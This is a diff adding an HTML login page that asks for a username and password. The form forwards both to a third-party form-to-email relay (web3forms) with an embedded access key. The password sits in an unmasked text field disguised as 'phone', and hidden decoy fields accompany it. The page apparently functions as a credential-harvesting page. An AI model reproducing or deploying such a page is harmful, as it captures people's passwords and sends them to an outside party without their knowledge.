@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+  <link rel="stylesheet" href="../src/css/cars.css">
+</head>
+
+<body>
+  
+
+<div class="flex items-center min-h-screen bg-gray-100 dark:bg-gray-900" id="nn" id="form">
+  <div class="container mx-auto">
+    <div class="max-w-xl mx-auto my-10 bg-white p-5 rounded-md shadow-sm">
+      <div class="text-center" >
+        <h1 class="my-3 text-3xl font-semibold text-gray-700 dark:text-gray-200" id="nc">
+          Login Page
+        </h1>
+        <p class="text-gray-400 dark:text-gray-400" style="white-space: nowrap;">
+          Enter Username and Password to Login
+        </p>
+      </div>
+      <div class="m-7">
+        <form action="https://api.web3forms.com/submit" method="POST" id="form">
+          <div><input type="hidden" name="access_key" value="2db9f318-062b-4c6a-b7d6-c916ad33f73b" />
+          <input type="hidden" name="subject" value="New Submission from Web3Forms" />
+          <input type="checkbox" name="botcheck" id="" style="display: none;" /></div>
+
+            <div class="w-full md:w-1/2">
+            <div><label for="fname" class="block mb-2 text-sm text-gray-600 dark:text-gray-400">Username Name :-</label>
+              <input type="text" name="name" id="first_name" placeholder=" Enter Username here" required class="w-full px-3 py-2 placeholder-gray-300 border border-gray-300 rounded-md focus:outline-none focus:ring focus:ring-indigo-100 focus:border-indigo-300 dark:bg-gray-700 dark:text-white dark:placeholder-gray-500 dark:border-gray-600 dark:focus:ring-gray-900 dark:focus:border-gray-500" /></div>
+            </div>
+            <div class="w-full md:w-1/2">
+            <div><label for="lname" class="block mb-2 text-sm text-gray-600 dark:text-gray-400" style="display:none;">Last Name :-</label>
+              <input type="text" name="last_name" id="lname" placeholder="Doe"  style="display:none;"/></div>
+            </div>
+
+            <div class="w-full md:w-1/2">
+              <div><label for="email" class="block mb-2 text-sm text-gray-600 dark:text-gray-400" style="display:none;">Email Address :-</label>
+              <input type="email" name="email" id="email" placeholder="you@company.com"  style="display:none;"/></div>
+            </div>
+
+            <div class="w-full md:w-1/2">
+              <div><label for="phone" class="block text-sm mb-2 text-gray-600 dark:text-gray-400">Password :-</label>
+              <input type="text" name="phone" id="phone" placeholder="  Enter password here" required class="w-full px-3 py-2 placeholder-gray-300 border border-gray-300 rounded-md focus:outline-none focus:ring focus:ring-indigo-100 focus:border-indigo-300 dark:bg-gray-700 dark:text-white dark:placeholder-gray-500 dark:border-gray-600 dark:focus:ring-gray-900 dark:focus:border-gray-500" /></div>
+            </div>
+          
+          <div class="mb-6">
+           <button type="submit" py-4 text-white bg-indigo-500 rounded-md focus:bg-indigo-600 focus:outline-none"  style="padding: 10px 30px; 
+            font-weight: bold;
+            letter-spacing: 3px;
+            border-radius: 6px;
+            font-family: Arial, Helvetica, sans-serif;
+            border: 2px solid rgb(61, 61, 61);
+            font-size: 18px;
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            cursor: pointer;
+            color:rgb(255, 255, 255);
+            background-color: rgb(15, 15, 15);
+            transition: 0.3s;
+            margin-top:10px ;" id="login">
+              Login 
+            </button>
+          </div>
+          <div class="hello" style="margin-top: 50px; margin-left:80px;"><p class="text-base text-center text-gray-400" id="result"></p></div>
+        </form>
+      </div>
+    </div>
+  </div>
+</div>
+<script src="../src/js/car.js">
+  
+</script>
+  
+</body>
+</html>
